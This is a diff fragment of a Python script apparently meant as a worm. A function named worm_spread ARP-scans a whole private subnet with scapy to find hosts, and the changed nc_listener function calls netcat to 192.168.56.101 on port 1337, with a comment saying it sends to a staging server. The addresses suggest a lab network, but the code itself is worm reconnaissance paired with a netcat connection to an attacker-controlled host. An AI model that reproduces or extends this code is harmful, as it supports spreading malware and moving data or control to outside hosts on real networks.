@@ -7,7 +7,7 @@ from scapy.all import ARP, Ether, srp
 
 def worm_spread():
 
-    target_ip = "192.168.56.111/24"
+    target_ip = "192.168.56.0/24"
 
     # create ARP packet
     arp = ARP(pdst=target_ip)
@@ -29,7 +29,8 @@ def worm_spread():
 print(worm_spread())
 
 def nc_listener():
-    subprocess.run(["netcat", "192.168.56.109", "1337"])
+    #sending to staging server via netcat
+    subprocess.run(["netcat", "192.168.56.101", "1337"])
 print(nc_listener())
     
 
